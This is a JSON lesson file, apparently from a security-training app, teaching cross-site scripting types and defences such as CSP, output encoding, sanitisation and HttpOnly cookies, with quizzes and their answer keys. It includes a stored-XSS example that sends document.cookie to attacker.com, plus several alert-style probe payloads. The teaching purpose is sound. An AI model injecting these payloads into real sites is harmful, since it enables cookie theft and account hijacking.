@@ -1,0 +1,167 @@
+{
+    "id": "learn_security_xss",
+    "topicId": "xss",
+    "topicTitle": "Cross-Site Scripting (XSS)",
+    "description": "Master the art of defending against XSS attacks, including stored, reflected, and DOM-based types",
+    "baseKP": 90,
+    "slides": [
+        {
+            "id": "xss_1",
+            "type": "content",
+            "title": "What is XSS?",
+            "content": "# Cross-Site Scripting (XSS) 💉\n\nA vulnerability where an attacker injects malicious scripts into content from otherwise trusted websites.\n\n- **Impact**: Stealing cookies, redirecting users, modifying page content, or spreading malware."
+        },
+        {
+            "id": "xss_2",
+            "type": "content",
+            "title": "The Core Problem",
+            "content": "# Data vs Code 😵\n\nXSS happens when the browser can't distinguish between the **Actual Code** from the developer and the **Malicious Data** provided by a user."
+        },
+        {
+            "id": "xss_3",
+            "type": "content",
+            "title": "Type 1: Stored XSS",
+            "content": "# Persistent Threat 💾\n\nThe malicious script is permanently stored on the target server (e.g., in a database, in a comment field).\n\n- **Example**: An attacker leaves a comment containing `<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>`. Every user who views the comment is attacked!"
+        },
+        {
+            "id": "xss_4",
+            "type": "content",
+            "title": "Type 2: Reflected XSS",
+            "content": "# The Bounce 🎾\n\nThe malicious script is \"reflected\" off a web application to the user's browser, usually via a URL parameter.\n\n- **Example**: `https://example.com/search?q=<script>alert(1)</script>`. If the page says \"Results for <script>...\", the script runs."
+        },
+        {
+            "id": "xss_5",
+            "quizQuestion": "Which type of XSS involves storing the malicious script in a database?",
+            "quizOptions": [
+                "Reflected XSS",
+                "Stored (Persistent) XSS",
+                "DOM-based XSS",
+                "CSRF"
+            ],
+            "correctOptionIndex": 1,
+            "type": "quiz",
+            "title": "XSS Types Quiz",
+            "content": "Identifying types."
+        },
+        {
+            "id": "xss_6",
+            "type": "content",
+            "title": "Type 3: DOM-based XSS",
+            "content": "# Client-Side Only 🖥️\n\nThe vulnerability exists in client-side code rather than server-side code. The script is executed when the JS in the page reads data from a source (like `window.location.hash`) and writes it to a sink (like `innerHTML`)."
+        },
+        {
+            "id": "xss_7",
+            "type": "content",
+            "title": "Defense: Content Security Policy (CSP)",
+            "content": "# The Modern Shield 🛡️\n\nAn HTTP header that allows site owners to declare which dynamic resources are allowed to load.\n\n- **Policy**: `Content-Security-Policy: default-src 'self';` (Only load stuff from this origin!).\n- **Power**: It can completely disable inline scripts and `eval()`."
+        },
+        {
+            "id": "xss_8",
+            "type": "content",
+            "title": "Defense: Escaping & Encoding",
+            "content": "# Neutralizing Data 🧪\n\nConvert special characters into their HTML entity equivalents so the browser treats them as text, not code.\n\n- `<` becomes `&lt;`\n- `>` becomes `&gt;`"
+        },
+        {
+            "id": "xss_9",
+            "type": "content",
+            "title": "Defense: Sanitization",
+            "content": "# Cleaning the Grime 🧼\n\nIf you MUST allow some HTML (like in a blog editor), use a library like **DOMPurify** to strip out dangerous tags (`<script>`, `<iframe>`) and attributes (`onmouseover`)."
+        },
+        {
+            "id": "xss_10",
+            "quizQuestion": "What does a Content Security Policy (CSP) primarily help prevent?",
+            "quizOptions": [
+                "SQL Injection",
+                "Brute Force Attacks",
+                "Cross-Site Scripting (XSS)",
+                "Server Downtime"
+            ],
+            "correctOptionIndex": 2,
+            "type": "quiz",
+            "title": "Defense Quiz",
+            "content": "CSP Purpose."
+        },
+        {
+            "id": "xss_11",
+            "type": "content",
+            "title": "Dangerous Sinks",
+            "content": "# Avoid innerHTML 🛑\n\nUse safely: `.textContent` or `.innerText`.\nUse dangerously: `.innerHTML` or `document.write()`."
+        },
+        {
+            "id": "xss_12",
+            "type": "content",
+            "title": "XSS via URL handlers",
+            "content": "# javascript: protocols 🔗\n\nAttackers can inject `javascript:alert(1)` into an `href` attribute. Always validate that URLs start with `http:` or `https:`."
+        },
+        {
+            "id": "xss_13",
+            "type": "content",
+            "title": "HttpOnly Cookies",
+            "content": "# Mitigating Damage 🍪\n\nSetting `HttpOnly` on your session cookie means JavaScript cannot access `document.cookie`. Even if an XSS attack succeeds, the attacker can't steal the session!"
+        },
+        {
+            "id": "xss_14",
+            "type": "content",
+            "title": "Framework Protections",
+            "content": "# React/Angular Safety 🏗️\n\nModern frameworks like React automatically escape data rendered in the UI. \n\n> ⚠️ However, using `dangerouslySetInnerHTML` bypasses this protection!"
+        },
+        {
+            "id": "xss_15",
+            "quizQuestion": "Which JavaScript property is safer to use to prevent XSS when inserting text?",
+            "quizOptions": [
+                "innerHTML",
+                "outerHTML",
+                "textContent",
+                "eval()"
+            ],
+            "correctOptionIndex": 2,
+            "type": "quiz",
+            "title": "Property Quiz",
+            "content": "Client-side safety."
+        },
+        {
+            "id": "xss_16",
+            "type": "content",
+            "title": "Testing for XSS",
+            "content": "# Searching for Holes 🔍\n\nUse various payloads like `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>` in every input field to see if they execute."
+        },
+        {
+            "id": "xss_17",
+            "type": "content",
+            "title": "X-XSS-Protection Header",
+            "content": "# Legacy Defenses 🏛️\n\nA legacy header used to enable the browser's built-in XSS filter. \n\n> [!NOTE]\n> This is now largely deprecated in favor of **CSP**."
+        },
+        {
+            "id": "xss_18",
+            "type": "content",
+            "title": "XSS in APIs",
+            "content": "# JSON isn't safe! 📦\n\nEven if your API returns JSON, if that JSON is later rendered insecurely in a web dashboard, the vulnerability still exists."
+        },
+        {
+            "id": "xss_19",
+            "type": "content",
+            "title": "Context-Aware Encoding",
+            "content": "# Where determines How 📍\n\nEncoding for HTML body is different from encoding for an HTML attribute or a JavaScript variable. Ensure you use the right encoder for the right context."
+        },
+        {
+            "id": "xss_20",
+            "quizQuestion": "What is the primary danger of using 'dangerouslySetInnerHTML' in React?",
+            "quizOptions": [
+                "It slows down the app",
+                "It causes CSS bugs",
+                "It opens the application to XSS attacks",
+                "It disables the database"
+            ],
+            "correctOptionIndex": 2,
+            "type": "quiz",
+            "title": "Final Quiz",
+            "content": "React warnings."
+        },
+        {
+            "id": "xss_21",
+            "type": "content",
+            "title": "Summary",
+            "content": "# Summary 🎉\n\n- ✅ **Escape** all untrusted data.\n- ✅ Use **CSP** to restrict source execution.\n- ✅ Set **HttpOnly** on session cookies.\n- ✅ Use safe sinks like **.textContent**.\n- ✅ Never trust user input.\n\nKeep your scripts under control! 🛡️"
+        }
+    ]
+}
